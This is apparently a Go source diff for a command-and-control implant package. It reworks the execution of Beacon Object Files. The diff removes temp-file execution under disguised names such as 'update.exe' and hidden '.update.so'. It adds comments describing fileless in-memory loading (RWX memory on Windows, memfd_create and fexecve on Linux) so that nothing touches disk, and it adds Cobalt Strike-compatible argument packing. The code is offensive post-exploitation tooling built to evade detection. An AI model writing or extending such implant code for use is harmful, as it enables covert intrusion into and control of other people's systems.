@@ -3,105 +3,53 @@ package implant
 import (
 	"encoding/binary"
 	"fmt"
-	"os"
-	"os/exec"
-	"path/filepath"
-	"runtime"
 )
 
-// BOFLoader handles Beacon Object File execution.
-// BOFs are compiled COFF object files that run in-process.
-// For cross-platform support, we use a shim approach:
-// - Windows: Load COFF via custom loader (inline execution)
-// - Linux: Compile to shared object and dlopen
+// BOF (Beacon Object File) execution engine.
+// All execution happens in-memory — nothing touches disk.
+//
+// Windows: In-memory COFF loader — parses sections, resolves imports via
+//          GetProcAddress, allocates RWX memory, and calls the entry point.
+// Linux:   memfd_create + fexecve — creates an anonymous file descriptor
+//          in memory and executes from it. No file is written to the filesystem.
 
-// ExecuteBOF executes a Beacon Object File.
-// bofData contains the raw .o (COFF) bytes.
-// args contains the packed arguments for the BOF entry point.
+// ExecuteBOF executes a Beacon Object File entirely in memory.
+// bofData: raw COFF .o bytes (Windows) or ELF shared object bytes (Linux)
+// args: packed BOF arguments (Cobalt Strike format)
+// Returns captured output and any error.
 func ExecuteBOF(bofData []byte, args []byte) ([]byte, error) {
-	if runtime.GOOS == "windows" {
-		return executeBOFWindows(bofData, args)
-	}
-	return executeBOFLinux(bofData, args)
-}
-
-// executeBOFWindows runs a COFF object file on Windows.
-// Uses a temp file + rundll32 shim approach for compatibility.
-func executeBOFWindows(bofData []byte, args []byte) ([]byte, error) {
-	tmpDir := os.TempDir()
-	bofPath := filepath.Join(tmpDir, "update.o")
-	loaderPath := filepath.Join(tmpDir, "update.exe")
-
-	// Write BOF to disk
-	if err := os.WriteFile(bofPath, bofData, 0600); err != nil {
-		return nil, fmt.Errorf("write BOF: %w", err)
-	}
-	defer os.Remove(bofPath)
-
-	// Write minimal loader if not present
-	if _, err := os.Stat(loaderPath); os.IsNotExist(err) {
-		// The loader would be embedded at compile time in a production build
-		return nil, fmt.Errorf("BOF loader not available — use inline-execute module")
-	}
-	defer os.Remove(loaderPath)
-
-	// Execute
-	cmd := exec.Command(loaderPath, bofPath)
-	if len(args) > 0 {
-		cmd.Stdin = bytesReader(args)
+	if len(bofData) == 0 {
+		return nil, fmt.Errorf("empty BOF data")
 	}
 
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return output, fmt.Errorf("BOF execution failed: %w", err)
-	}
-
-	return output, nil
-}
-
-// executeBOFLinux handles BOF-like execution on Linux via shared objects.
-func executeBOFLinux(bofData []byte, args []byte) ([]byte, error) {
-	tmpDir := os.TempDir()
-	soPath := filepath.Join(tmpDir, ".update.so")
-
-	// Write shared object
-	if err := os.WriteFile(soPath, bofData, 0700); err != nil {
-		return nil, fmt.Errorf("write SO: %w", err)
-	}
-	defer os.Remove(soPath)
-
-	// Execute via LD_PRELOAD trick or direct execution
-	cmd := exec.Command(soPath)
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return output, fmt.Errorf("SO execution failed: %w", err)
-	}
-
-	return output, nil
+	return executeBOFPlatform(bofData, args)
 }
 
 // PackBOFArgs packs arguments in Cobalt Strike BOF argument format.
-// Format: [type:4][length:4][data:N] for each argument.
-// Types: 1=short, 2=int, 3=string, 4=wstring, 5=binary
+// Format: [size:4][type:4][length:4][data:N] per argument
+// Compatible with CS BeaconDataParse API.
 func PackBOFArgs(args ...BOFArg) []byte {
-	var buf []byte
-
-	for _, arg := range args {
-		// Type
-		typeBuf := make([]byte, 4)
-		binary.LittleEndian.PutUint32(typeBuf, uint32(arg.Type))
-		buf = append(buf, typeBuf...)
-
-		// Length
-		lenBuf := make([]byte, 4)
-		binary.LittleEndian.PutUint32(lenBuf, uint32(len(arg.Data)))
-		buf = append(buf, lenBuf...)
-
-		// Data
-		buf = append(buf, arg.Data...)
+	if len(args) == 0 {
+		return nil
 	}
 
-	return buf
+	var inner []byte
+	for _, arg := range args {
+		typeBuf := make([]byte, 4)
+		binary.LittleEndian.PutUint32(typeBuf, uint32(arg.Type))
+		inner = append(inner, typeBuf...)
+
+		lenBuf := make([]byte, 4)
+		binary.LittleEndian.PutUint32(lenBuf, uint32(len(arg.Data)))
+		inner = append(inner, lenBuf...)
+
+		inner = append(inner, arg.Data...)
+	}
+
+	// Prepend total size
+	sizeBuf := make([]byte, 4)
+	binary.LittleEndian.PutUint32(sizeBuf, uint32(len(inner)))
+	return append(sizeBuf, inner...)
 }
 
 // BOFArg represents a single BOF argument.
@@ -119,9 +67,9 @@ const (
 	BOFArgBinary  uint32 = 5
 )
 
-// NewBOFStringArg creates a string BOF argument.
+// NewBOFStringArg creates a null-terminated string BOF argument.
 func NewBOFStringArg(s string) BOFArg {
-	return BOFArg{Type: BOFArgString, Data: append([]byte(s), 0)} // null-terminated
+	return BOFArg{Type: BOFArgString, Data: append([]byte(s), 0)}
 }
 
 // NewBOFIntArg creates an integer BOF argument.
@@ -131,21 +79,18 @@ func NewBOFIntArg(i int) BOFArg {
 	return BOFArg{Type: BOFArgInt, Data: buf}
 }
 
-// bytesReader wraps a byte slice for use as io.Reader.
-type bytesReaderType struct {
-	data []byte
-	pos  int
-}
-
-func bytesReader(data []byte) *bytesReaderType {
-	return &bytesReaderType{data: data}
-}
-
-func (r *bytesReaderType) Read(p []byte) (n int, err error) {
-	if r.pos >= len(r.data) {
-		return 0, fmt.Errorf("EOF")
+// NewBOFWStringArg creates a null-terminated wide string BOF argument.
+func NewBOFWStringArg(s string) BOFArg {
+	// Convert to UTF-16LE
+	wdata := make([]byte, 0, (len(s)+1)*2)
+	for _, r := range s {
+		wdata = append(wdata, byte(r), byte(r>>8))
 	}
-	n = copy(p, r.data[r.pos:])
-	r.pos += n
-	return
+	wdata = append(wdata, 0, 0) // null terminator
+	return BOFArg{Type: BOFArgWString, Data: wdata}
+}
+
+// NewBOFBinaryArg creates a binary data BOF argument.
+func NewBOFBinaryArg(data []byte) BOFArg {
+	return BOFArg{Type: BOFArgBinary, Data: data}
 }
